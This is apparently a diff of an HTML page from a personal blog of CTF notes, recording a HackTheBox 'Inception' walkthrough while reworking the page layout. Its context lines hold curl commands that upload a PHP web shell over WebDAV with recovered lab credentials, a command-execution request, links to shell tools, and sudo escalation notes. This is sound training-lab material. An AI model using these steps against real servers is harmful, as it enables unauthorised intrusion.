@@ -10,20 +10,10 @@
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127988;</text></svg>">
 </head>
 <body>
-<button id="menu-toggle" aria-label="Toggle navigation">&#9776;</button>
-<div class="layout">
-<aside class="sidebar" id="sidebar">
-  <a class="brand" href="../../index.html">
-    <span class="brand-flag">&#127988;</span>
-    <span class="brand-text"><strong>the-grizzly-bear</strong><small>Cybersecurity Notes &amp; CTF Writeups</small></span>
-  </a>
-  <nav class="nav" id="nav-root" data-current="htb/completed-machines/inception.html" data-root="../.."></nav>
-</aside>
 <main class="content">
   <article class="doc">
   <div class="breadcrumb"><a href="../../index.html">the-grizzly-bear</a> &rsaquo; <a href="../index.html">HackTheBox</a> &rsaquo; <a href="index.html">Completed Machines</a></div>
 <h1 id="title">Inception</h1>
-
 <p class="figure"><a class="img-link" href="inception/untitled.png"><img src="inception/untitled.png" alt="Untitled" loading="lazy"></a></p>
 <p>messsed around with proxy chains but didnt get much yet</p>
 <p class="figure"><a class="img-link" href="inception/untitled-1.png"><img src="inception/untitled-1.png" alt="Untitled" loading="lazy"></a></p>
@@ -106,7 +96,7 @@ webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0</p>
 <p>─[us-dedicated-100-dhcp]─[10.10.14.2]─[htb-ep-8352@pwnbox-base]─[~]<br>
 └──╼ [★]$ curl -X PUT <a href="http://webdav_tester:babygurl69@10.129.1.104/webdav_test_inception/shell.php" target="_blank" rel="noopener">http://webdav_tester:babygurl69@10.129.1.104/webdav_test_inception/shell.php</a> -d @shell.php</p>
 <p>curl -X PUT <a href="http://webdav_tester:babygurl69@10.129.1.104/webdav_test_inception/shell2.php?cmd=id" target="_blank" rel="noopener">http://webdav_tester:babygurl69@10.129.1.104/webdav_test_inception/shell.pycmd=id</a></p>
-<p><a href="https://github.com/Arrexel/phpbash.git" target="_blank" rel="noopener">https://github.com/Arrexel/phpbash.git</a></p>
+<a class="bookmark" href="https://github.com/Arrexel/phpbash.git" target="_blank" rel="noopener"><div class="bm-text"><div class="bm-title">GitHub - Arrexel/phpbash: A semi-interactive PHP shell compressed into a single file.</div><div class="bm-desc">A semi-interactive PHP shell compressed into a single file. - Arrexel/phpbash</div><div class="bm-url"><img class="bm-icon" src="../../assets/bookmarks/github-com-arrexel-phpbash-git-icon.png" alt="" loading="lazy">https://github.com/Arrexel/phpbash.git</div></div></a>
 <p class="figure"><a class="img-link" href="inception/untitled-21.png"><img src="inception/untitled-21.png" alt="Untitled" loading="lazy"></a></p>
 <p class="figure"><a class="img-link" href="inception/untitled-22.png"><img src="inception/untitled-22.png" alt="Untitled" loading="lazy"></a></p>
 <p><a href="http://10.129.1.104/webdav_test_inception/phpbash.php" target="_blank" rel="noopener">http://10.129.1.104/webdav_test_inception/phpbash.php</a></p>
@@ -155,10 +145,10 @@ www-data<br>
 uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>
 ─[us-dedicated-100-dhcp]─[10.10.14.2]─[htb-ep-8352@pwnbox-base]─[~]<br>
 └──╼ [★]$ curl --data-urlencode 'cat /home/cobb/user.txt' <a href="http://webdav_tester:babygurl69@10.129.1.104/webdav_test_inception/s.php" target="_blank" rel="noopener">http://webdav_tester:babygurl69@10.129.1.104/webdav_test_inception/s.php</a>?</p>
-<p><a href="https://0xdf.gitlab.io/2022/04/04/htb-inception.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2022/04/04/htb-inception.html</a></p>
+<a class="bookmark" href="https://0xdf.gitlab.io/2022/04/04/htb-inception.html" target="_blank" rel="noopener"><div class="bm-text"><div class="bm-title">HTB: Inception</div><div class="bm-desc">Inception was one of the first boxes on HTB that used containers. I’ll start by exploiting a dompdf WordPress plugin to get access to files on the filesystem, which I’ll use to identify a WedDAV directory and credentials. I’ll abuse WebDAV to upload a webshell, and get a foothold in a container. Unf</div><div class="bm-url"><img class="bm-icon" src="../../assets/bookmarks/0xdf-gitlab-io-2022-04-04-htb-inception-html-icon.png" alt="" loading="lazy">https://0xdf.gitlab.io/2022/04/04/htb-inception.html</div></div><div class="bm-img"><img src="../../assets/bookmarks/0xdf-gitlab-io-2022-04-04-htb-inception-html.png" alt="" loading="lazy"></div></a>
 <p><a href="https://0xdf.gitlab.io/files/inception-forwardshell.py" target="_blank" rel="noopener">https://0xdf.gitlab.io/files/inception-forwardshell.py</a></p>
 <p>didnt quite get this one working</p>
-<p><a href="https://github.com/IppSec/forward-shell" target="_blank" rel="noopener">https://github.com/IppSec/forward-shell</a></p>
+<a class="bookmark" href="https://github.com/IppSec/forward-shell" target="_blank" rel="noopener"><div class="bm-text"><div class="bm-title">GitHub - IppSec/forward-shell</div><div class="bm-desc">Contribute to IppSec/forward-shell development by creating an account on GitHub.</div><div class="bm-url"><img class="bm-icon" src="../../assets/bookmarks/github-com-ippsec-forward-shell-icon.png" alt="" loading="lazy">https://github.com/IppSec/forward-shell</div></div><div class="bm-img"><img src="../../assets/bookmarks/github-com-ippsec-forward-shell.png" alt="" loading="lazy"></div></a>
 <p>Login with cobb from shell with password from wp-config.php</p>
 <p class="figure"><a class="img-link" href="inception/untitled-28.png"><img src="inception/untitled-28.png" alt="Untitled" loading="lazy"></a></p>
 <p>Sudoers shows full rights,  sudo up</p>
@@ -192,14 +182,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>
 <p class="figure"><a class="img-link" href="inception/untitled-44.png"><img src="inception/untitled-44.png" alt="Untitled" loading="lazy"></a></p>
 <p class="figure"><a class="img-link" href="inception/untitled-45.png"><img src="inception/untitled-45.png" alt="Untitled" loading="lazy"></a></p>
   </article>
-  <footer class="foot">Built from a Notion export · <a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
+  <footer class="foot"><a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
 </main>
-</div>
-<script src="../../assets/nav.js" defer></script>
-<script>
-document.getElementById('menu-toggle').addEventListener('click',function(){
-  document.getElementById('sidebar').classList.toggle('open');
-});
-</script>
 </body>
 </html>
